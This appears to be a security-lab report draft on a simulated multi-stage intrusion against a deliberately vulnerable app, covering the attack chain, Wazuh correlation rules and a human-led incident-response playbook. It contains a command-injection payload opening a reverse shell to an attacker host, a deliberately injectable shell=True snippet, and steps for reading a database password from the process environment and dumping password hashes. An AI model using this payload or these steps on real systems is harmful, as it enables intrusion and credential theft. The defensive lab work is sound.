# Threat 3 — Advanced Persistent Threat (the correlation threat)

Working notes + report draft. Mirrors the required report subsections
(description, relevance, exploitation, metrics, response, PoC post-mortem).

## Target and idea
A multi-stage intrusion, not a single noisy event. The attacker (`attacker-01.inet`,
192.168.100.66) reaches only `lb-01`, so the chain goes *through the application*:
a **reused credential** (bob, from threat 2) buys a session, the deliberately
vulnerable `/report` endpoint (`SSLE_VULNERABLE=1`, command injection via `shell=True`)
turns that session into **code execution** on an API container, a **reverse shell**
calls home, the foothold **probes the internal network**, reads the **DB password from
the process environment**, and **exfiltrates** the `users` table from `db-01`.

What makes this the **correlation threat**: no single step is conclusive on its own
(a weird `/report` argument could be a scanner; one blocked probe could be a
fat-finger; one outbound connection could be a package fetch). The *chain* — the same
host doing several of these, in order, close in time — is the signature. This keeps it
distinct from threats 1–2:

| | DoS (1) | Credential stuffing (2) | APT (3) |
|---|---|---|---|
| shape | volume / saturation | login semantics (distinct users) | **a chain of low-and-slow host/network anomalies** |
| detected from | nginx rate, Prom CPU | app login log, Prom `no_user` | **correlated signals across app log + host kernel log** |
| decided by | one rule | one rule | **a correlation rule over several** |

## Why it matters (relevance)
An APT is the scenario the whole monitoring stack exists for: a patient attacker who
gets a foothold and moves quietly toward data. It stitches the first two threats
together — the quiet foothold here is **bob's reused password** (threat 2's takeover),
and the payoff is the **database** the DoS/stuffing defences were protecting. It also
exercises the parts of the design that only matter under a real intrusion: the
deny-by-default firewall (which *blocks and logs* the lateral probes), the call graph
(which defines what "a connection not in the graph" even means), and the SIEM's ability
to **correlate** rather than just match.

## The entry weakness (documented, intentional)
`apps/api/app.py`, `/report` (GET, `@login_required`):
```python
sensor = request.args.get("sensor", "")
out = subprocess.run(f"echo Report for sensor {sensor}; date -u",
                     shell=True, capture_output=True, text=True, timeout=5)
```
`sensor` goes into a shell command unchecked, so `sensor=x; <command>` runs a second
command. Guarded by `SSLE_VULNERABLE=1` so the app is safe by default and the weakness
is a visible, deliberate choice. **Fix** (for the report): drop `shell=True`, pass an
argument list, and validate `sensor` against `^[a-z0-9-]+$` — which is exactly the
allow-list the *detection* rule uses (see 100121).

## Attack (the kill chain) — `scripts/apt_chain.py`
Run from `attacker-01`, stdlib only, talks only to `lb-01:80` for the foothold and then
drives everything over the reverse shell (the attacker's box never touches the internal
network directly — the firewall forbids it). Stages and the signal each one leaves:

| # | Stage | Action | Signal |
|---|---|---|---|
| 1 | initial access | `POST /login` bob:password123 (reused cred, threat 2) | app log `login_ok` |
| 2 | execution + C2 | `GET /report?sensor=x; setsid bash -c 'bash >& /dev/tcp/<lhost>/443 0>&1' …&` | app log `report` with a shell-metachar sensor; **C2 egress** api→attacker:443 |
| 3 | discovery | over C2: `id`, `hostname`, blocked probe to the management net (`prom-01`/`siem-01:22`) | **blocked lateral recon** (firewall drop) |
| 4 | credential access | `cat /proc/self/environ` → `DB_PASSWORD` | (host already compromised) |
| 5 | collection/exfil | `psycopg2` from the foothold → `db-01`, dump `users` (password hashes) | DB connection on db-01 (looks like the app — ambiguous) |

Implementation notes worth keeping:
- The injected payload ends with `& #` so the `#` comments out the `; date -u` the
  vulnerable code appends after our value (otherwise `… & ; date -u` is a bash syntax
  error). The shell is **non-interactive** `bash` (not `bash -i`) so there is no prompt
  or input echo to desync the C2 transcript.
- `setsid … &` detaches the shell so gunicorn's `subprocess.run(timeout=5)` returns
  immediately while the shell lives on — which is also *why* the detached `bash` and its
  outbound socket are the anomaly detection catches.
- nginx round-robins `/report`, so the foothold is **api-01 or api-02** on any given run
  (the detection keys on the foothold IP, so either works).

Verified end to end (transcript `images/apt/apt_chain_transcript.txt`): session as bob →
reverse shell connected from the API container → `uid=999(ssle)` → blocked recon
(`rc=124`) → leaked `DB_PASSWORD` → connected to `db-01` as role `api` and dumped
alice/bob/carol password hashes.

## Detection (the hard part)
All signals converge on the **manager**, which correlates them. Rules in
`wazuh/local_rules.xml` (family `10012x` per-signal, `10013x` correlation).

**Where each signal is observed — and the gaps we had to close:**

1. **Command injection** — app JSON log `/var/log/ssle/api.log` (shipped by the api agent).
   - `100120` (level 3): a `/report` event (raw marker).
   - `100121` (level 12): the `sensor` contains a character **outside `^[a-z0-9-]+$`**
     (PCRE2 negative class). An **allow-list**, not a bad-char blocklist, so no forgotten
     metacharacter bypasses it; a legitimate sensor id never trips it. Near-conclusive RCE
     attempt on its own.

2. **C2 / exfil egress** — the reverse shell `api→attacker:443`. The firewall *allows*
   this (the broad "apt needs 80/443 to any" egress rule — `architecture.md`, "Firewall",
   flags it as an exfil path), so Incus never drops or logs it. A **host IDS nft rule**
   (`config/ssle_ids.nft`, `inet forward` hook, log-only) logs every **NEW TCP from a site
   subnet to `192.168.100.0/24`** (the external actor network) with prefix `SSLE-C2`. A
   backend *never* initiates to that network legitimately (apps receive from the LB; apt
   goes to the real internet, not there), so this is a **zero-false-positive** reverse-shell
   / exfil signal — and it is the "new outbound connection not in the call graph" signal
   `architecture.md` asked for. Rule `100123` (level 10).

3. **Blocked lateral recon** — the Incus bridge ACLs drop the probe. `architecture.md`
   noted the drops were "invisible" because `incus network acl show-log` is OVN-only — but
   that is only the *Incus CLI*: the **kernel logs every drop** with prefix `eth0-egress`
   all along. They just needed shipping. Rule `100122` (level 8): a dropped NEW TCP between
   two internal hosts (Wazuh's built-in `kernel` decoder → rule 4100 → our 100122).

4. **DB login on db-01** (`log_connections` on) — a **corroborator only**: the pivot
   connects *as role `api` from the API container's IP*, identical to normal app traffic,
   so it is not anomalous by itself. Mentioned, not used as a chain leg.

5. **FIM / unusual process** — our chain is **fileless** (in-memory shell, no dropped
   file), so FIM does not fire for it. FIM is deployed and would catch a *file-dropping*
   variant; we keep that as a documented, demonstrated-separately capability rather than
   faking a file drop into a low-and-slow chain.

**The correlation — `100130` (level 14, the highest in the project):**
```
if_sid 100122  (blocked recon)  AND  if_matched_sid 100123 (C2 egress)  within 600s,
same_source_ip  →  "APT CHAIN: foothold X called out to the attacker network AND probed
internal hosts within 10m"
```
Neither leg proves an intrusion; a host doing **both**, keyed on the same foothold IP,
does. Verified firing **live** on the full chain.

### Why the chain is built from the two *host* signals (a real finding)
The obvious correlation would be "injection (100121) → recon (100122)". It does not work
live, for an instructive reason we verified:

- **Wazuh's `if_matched_sid` correlation is per-agent (and per rule-matching thread).** The
  injection is logged by the **api** agent, the recon/C2 by the **host** agent. A
  cross-agent, timeframe-only correlation **never fired** live, while an identical
  same-agent correlation fired instantly.
- Two consequences, both codified:
  1. `analysisd.rule_matching_threads=1` (default is one thread *per core*, and each thread
     keeps its own correlation history — so correlated events on different threads miss).
     This also hardens the DoS/stuffing frequency rules.
  2. The robust chain is built from **two signals the same (host) agent observes** — C2
     egress and recon — correlated with `<same_source_ip/>` (the dedicated element;
     `<same_field>srcip</same_field>` silently fails because `srcip` is a *static* field).
- The **injection stays a standalone level-12 alert** (the "how they got in"); it simply
  cannot be auto-correlated across agents. A production fix would normalise host identity
  (map the container name ↔ its IP) so app-log and network events share a key.

### Shipping the host logs
A Wazuh agent runs on the VM host (`h01.ssle`, agent 006 —
`scripts/provision_host_agent.sh`): it loads the nft IDS rule and reads **journald**,
filtered to `eth0-egress |SSLE-C2 ` **and** `PROTO=TCP` so the routine DHCP noise (UDP)
never leaves the host. This is distinct from the Prometheus "host observed, not declared"
rule (that was to stop a *container* faking its own metrics; SIEM host logs are collected
*by* the host, so there is no conflict). `ensure_siem_acl` now admits the host
(`10.10.0.1`) to the manager's 1514/1515.

## Response — alert, don't auto-act (and why that differs from DoS)
**Decision: no automated response; the level-14 `100130` pages a human, and a manual
incident-response playbook follows.** For DoS the auto-block was safe because the attacker
is *external* and low-collateral. For an APT the same reflex is dangerous:

1. **The "attacker" is now an internal production host** (api-01/02). Auto-isolating it or
   killing its processes is a self-inflicted outage on a false positive.
2. **Per-signal confidence is low by design** — only the *chain* (`100130`) is
   high-confidence, so any action must key off the correlation, never a single leg.
3. **Tipping off the adversary** — an automated block reveals detection; a real APT then
   adapts and goes quieter. Observe-first beats auto-kill.
4. **Isolation destroys volatile forensics** — the in-memory shell and attacker tooling.

**Incident-response playbook (triggered by `100130`):**
1. **Triage** — in Wazuh, pull the chain for the foothold IP: `100121` (injection, which
   API), `100123` (C2 destination), `100122` (what it probed). Confirm the timeline.
2. **Preserve** — `incus snapshot` the compromised container *before* touching it (keep the
   live shell/tooling for forensics).
3. **Contain** — isolate just that container (stop or detach its NIC). The **two-API design
   means service survives** if only one is hit — a deliberate, acceptable trade-off, unlike
   an automated kill. Block egress to the C2 IP at the edge if exfil is ongoing.
4. **Eradicate** — rotate the leaked `DB_PASSWORD` (it was readable in the process env),
   fix `/report` (argument list + `^[a-z0-9-]+$` validation, `SSLE_VULNERABLE=0`), and
   address the entry: bob's **reused password** → password policy / MFA (links to threat 2).
5. **Recover** — rebuild the container from the build script (**one command** — the whole
   point of scripted infrastructure) and restore it to service.

This is the report's thesis for APT: the safe, effective response is **detection +
deliberate human IR**, not a reflex block — the opposite trade-off from DoS.

## Metrics / evidence
APT is low-and-slow, so there is no Prometheus volume spike to show (that absence is itself
the point — it hides under the thresholds that catch DoS/stuffing). Evidence is the
**kill-chain transcript** and the **correlated alerts**:

- `images/apt/apt_chain_transcript.txt` — the full chain with the leaked password and the
  dumped hashes.
- Wazuh dashboard (Discover, `wazuh-alerts-*`, filtered to the APT rule ids):
  - `images/apt/ui/wazuh_apt-chain.png` — the `100130` **chain** alerts (level 14, foothold
    `10.10.1.22`, "called out to the attacker network AND probed internal hosts within 10m"),
    with the per-run spikes in the histogram.
  - `images/apt/ui/wazuh_apt-entry-c2.png` — the entry legs: `100121` injection (level 12)
    with the reverse-shell payload captured in the `sensor` value, and `100123` C2 (level 10).
  - `images/apt/ui/wazuh_apt-legs.png` — the `100122` recon legs (level 8, "blocked connection
    … not in the call graph").

Before / during / after:

| Phase | injection (100121) | C2 (100123) | recon (100122) | chain (100130) |
|---|---|---|---|---|
| before | — | — | — | — |
| during (chain) | fires (L12) | fires (L10) | fires (L8) | **fires (L14)** |
| after (IR) | endpoint fixed / `SSLE_VULNERABLE=0`; creds rotated; container rebuilt | | | |

## Limitations (the report rewards these)
- **Cross-agent correlation is per-agent in Wazuh** — the reason the chain is built from
  host-only signals and the injection is a standalone alert. A production SIEM would
  normalise host identity or correlate in the indexer/search layer (cross-agent by nature).
- **The C2 signal depends on the broad `80/443`-to-any egress rule** existing. Tighten that
  (an apt proxy as the only allowed external destination) and the reverse shell is *blocked*
  instead of *logged* — better prevention, but then the C2 leg would move to the drop log
  like the recon leg. Either way the chain holds.
- **Same-tier recon (api→db:22) is not shipped** — intra-bridge drops log under the
  `eth0-ingress` prefix (the destination veth's chain), which the host agent filters out; so
  the demonstrated recon targets the *management* network (cross-subnet, logged as
  `eth0-egress`). Shipping `eth0-ingress` too would catch it, at the cost of the ICMP-reject
  noise.
- **Fileless chain → no FIM leg** (documented above).
- **The DB-exfil leg is ambiguous** (looks like the app) and so is a corroborator, not a
  trigger.
- **The nft IDS rule is re-applied by the build, not persistent across reboot** — fine for
  "rebuild with one command"; a production host would load it via a systemd unit /
  `/etc/nftables.d`.
- **HTTP, not HTTPS** — the injection and the leaked secret travel in clear text (shared
  limitation with the other threats).

## PoC post-mortem
What worked: the chain runs end to end and each stage leaves a distinct, verified signal;
the allow-list injection rule is near-zero-false-positive; the `SSLE-C2` egress rule is a
clean, zero-FP reverse-shell signal that also closes the architecture's "new outbound"
gap; and the `100130` correlation fires live on the real chain. What the limits are: the
cross-agent correlation constraint forced a host-centric chain design (a genuine SIEM
lesson), the response is deliberately *not* automated (the DoS reflex would self-DoS a
production host), and the entry was a reused credential + a deliberately weak endpoint —
so the real fixes live in password policy/MFA (threat 2) and input validation, not in the
SIEM. Links: threat 2 (bob's reused password is the APT's foothold) and threat 1 (the APT
is the quiet opposite of the flood — and the reason per-event SIEM alerting alone is not
enough).
